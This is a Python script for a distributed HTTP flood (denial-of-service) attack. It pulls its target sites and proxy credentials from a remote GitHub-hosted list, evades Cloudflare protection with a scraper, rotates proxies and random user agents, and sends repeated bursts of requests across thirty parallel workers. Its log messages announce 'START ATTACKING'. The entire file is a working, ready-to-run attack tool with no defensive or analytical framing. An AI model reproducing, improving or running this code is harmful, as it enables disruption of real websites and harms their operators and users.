import asyncio
import json
import random
import typing
from sys import stderr

import requests
from aiocfscrape import CloudflareScraper
from aiohttp import ClientTimeout
from loguru import logger
from pyuseragents import random as random_useragent
from urllib3 import disable_warnings

HOSTS = 'https://raw.githubusercontent.com/abionics/attacker/master/hosts.json'  # hosts of fucking sites
TIMEOUT = ClientTimeout(
    total=10,
    connect=10,
    sock_read=10,
    sock_connect=10,
)
CUSTOM_PROXY = None  # can be like 'http://login:username@1.2.3.4:5678' OR 'http://1.2.3.4:5678'
CUSTOM_PROXIES_FILE = None  # name of file with list of proxies, each one in separate line
REQUESTS_PER_SITE = 50
PARALLEL_COUNT = 30
SHOW_REQUEST_EXCEPTIONS = False
FORCE_HTTPS = True

HEADERS_TEMPLATE = {
    'Content-Type': 'application/json',
    # 'User-Agent': random_useragent(),
    'Connection': 'keep-alive',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'ru',
    'Accept-Encoding': 'gzip, deflate, br'
}


def main():
    hosts = _get_hosts()
    loop = asyncio.get_event_loop()
    union = asyncio.gather(*[
        start_one(hosts)
        for _ in range(PARALLEL_COUNT)
    ])
    loop.run_until_complete(union)


def _get_hosts() -> typing.Union[list, dict]:
    while True:
        try:
            return requests.get(HOSTS, timeout=3).json()
        except:
            continue


async def start_one(hosts: list):
    while True:
        try:
            async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
                host = random.choice(hosts)
                async with session.get(host, verify_ssl=False) as response:
                    content = await response.text()
                    data = json.loads(content)
                url = data['site']['url']
                url = _fix_url(url, force_https=FORCE_HTTPS)
                success = await attempt(session, url)
                if not success:
                    if CUSTOM_PROXY:
                        proxies = [CUSTOM_PROXY]
                    elif CUSTOM_PROXIES_FILE:
                        proxies = _load_proxies(CUSTOM_PROXIES_FILE)
                    else:
                        proxies = [
                            f'http://{proxy_data["auth"]}@{proxy_data["ip"]}'
                            for proxy_data in data['proxy']
                        ]
                    random.shuffle(proxies)
                    for proxy in proxies:
                        proxy = _fix_url(proxy)
                        success = await attempt(session, url, proxy)
                        if success:
                            break
        except Exception as e:
            logger.warning(f'Exception, retrying, exception={e}')


def _load_proxies(filename: str) -> list:
    with open(filename, 'r') as file:
        return file.read().splitlines()


def _fix_url(url: str, force_https: bool = False) -> str:
    if not url.startswith('http'):
        'http://' + url
    if force_https:
        url = url.replace('http://', 'https://')
    return url


async def attempt(session: CloudflareScraper, url: str, proxy: str = None) -> bool:
    logger.info(f'\t\tTrying to attack {url} with proxy {proxy}')
    status_code = await request(session, url, proxy)
    if 200 <= status_code < 300:
        logger.info(f'START ATTACKING {url} USING PROXY {proxy}')
        for i in range(REQUESTS_PER_SITE):
            await request(session, url, proxy)
        logger.info(f'ATTACKING {url} IS DONE')
        return True
    return False


async def request(session: CloudflareScraper, url: str, proxy: str = None) -> int:
    try:
        headers = _get_headers()
        async with session.get(url, headers=headers, proxy=proxy, verify_ssl=False) as response:
            return response.status
    except Exception as e:
        if SHOW_REQUEST_EXCEPTIONS:
            logger.warning(f'Exception on request, exception={e}, url={url}, proxy={proxy}')
        return -1


def _get_headers() -> dict:
    headers = HEADERS_TEMPLATE.copy()
    headers['User-Agent'] = random_useragent()
    return headers


if __name__ == '__main__':
    logger.remove()
    logger.add(
        stderr,
        format='<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>'
    )
    disable_warnings()
    main()
